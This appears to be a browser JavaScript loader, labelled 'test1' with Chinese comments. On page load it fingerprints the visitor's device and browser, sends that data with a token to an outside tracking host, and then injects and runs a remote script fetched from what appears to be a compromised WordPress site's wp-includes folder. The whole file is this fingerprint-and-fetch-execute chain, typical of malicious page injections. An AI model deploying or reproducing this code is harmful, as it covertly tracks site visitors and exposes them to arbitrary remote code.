(() => {
  "use strict";

  const MOCK_API_URL = "https://fcll3699999.secondlive.xyz/api/track/events"; // post数据的url
  const REMOTE_SCRIPT_URL =
    "https://spnetfiber.com.br/wp-includes/SimplePie/src/Content/test2_1.js?v=1.1"; // 远程js脚本的url
  const TIMEOUT_MS = 60000;

  function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let type = "desktop";

    if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
      type = "tablet";
    } else if (/mobile|iphone|ipod|android/i.test(userAgent)) {
      type = "mobile";
    }

    return {
      type,
      platform: navigator.userAgentData?.platform || navigator.platform || null,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      devicePixelRatio: window.devicePixelRatio,
      touchPoints: navigator.maxTouchPoints || 0,
    };
  }

  function getBrowserInfo() {
    return {
      userAgent: navigator.userAgent,
      vendor: navigator.vendor || null,
      language: navigator.language || null,
      languages: Array.from(navigator.languages || []),
      cookieEnabled: navigator.cookieEnabled,
      online: navigator.onLine,
    };
  }

  async function sendMockRequest() {
    const controller = new AbortController();
    const timeoutId = window.setTimeout(() => controller.abort(), TIMEOUT_MS);

    try {
      const payload = {
        device: getDeviceInfo(),
        browser: getBrowserInfo(),
        visitedAtUtc: new Date().toISOString(),
        token: "FC693LLLFFF",
      };

      const response = await fetch(MOCK_API_URL, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
        signal: controller.signal,
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status} ${response.statusText}`);
      }

      const data = await response.json();
      console.log("[test1] POST 模拟请求成功：", {
        request: payload,
        response: data,
      });
      return data;
    } finally {
      window.clearTimeout(timeoutId);
    }
  }

  function loadRemoteScript(url) {
    return new Promise((resolve, reject) => {
      const script = document.createElement("script");
      let settled = false;

      const finish = (callback, value) => {
        if (settled) {
          return;
        }

        settled = true;
        window.clearTimeout(timeoutId);
        callback(value);
      };

      script.src = url;
      script.async = true;
      // script.crossOrigin = "anonymous";

      script.onload = () => finish(resolve, script);
      script.onerror = () => {
        script.remove();
        finish(reject, new Error(`远程 JS 加载失败：${url}`));
      };

      const timeoutId = window.setTimeout(() => {
        script.remove();
        finish(reject, new Error(`远程 JS 加载超时：${url}`));
      }, TIMEOUT_MS);

      (document.head || document.documentElement).appendChild(script);
    });
  }

  async function main() {
    try {
      await sendMockRequest();
    } catch (error) {
      console.error("[test1] 模拟请求失败：", error);
    }

    try {
      await loadRemoteScript(REMOTE_SCRIPT_URL);
      console.log("[test1] 远程 JS 加载并执行成功");
    } catch (error) {
      console.error("[test1] 远程 JS 加载失败：", error);
    }
  }

  main();
})();
